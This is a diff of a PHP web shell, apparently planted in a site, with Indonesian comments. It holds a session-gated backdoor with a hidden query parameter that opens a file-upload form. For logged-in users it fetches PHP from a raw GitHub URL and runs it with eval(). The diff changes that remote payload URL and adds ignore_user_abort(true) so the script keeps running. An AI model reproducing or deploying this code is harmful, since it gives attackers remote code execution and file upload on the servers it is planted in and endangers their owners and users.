@@ -1,7 +1,6 @@
 <?php
-
+ignore_user_abort(true);
 session_start();
-
 // Fungsi untuk memeriksa status login
 function is_logged_in() {
     return isset($_SESSION['X-H0UR']);
@@ -56,7 +55,9 @@ echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" ty
     }
 }
 
-// 
+//
+
+
 if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
     echo '<form method="post" enctype="multipart/form-data">';
     echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
@@ -81,7 +82,7 @@ if (isset($_FILES['file']['tmp_name'])) {
 
 // Jika pengguna sudah login, ambil dan eksekusi konten dari URL
 if (is_logged_in()) {
-    $url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/byp.php';
+    $url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/@cong.php2';
     $content = getRawContent($url);
     eval('?>' . $content);
     exit;
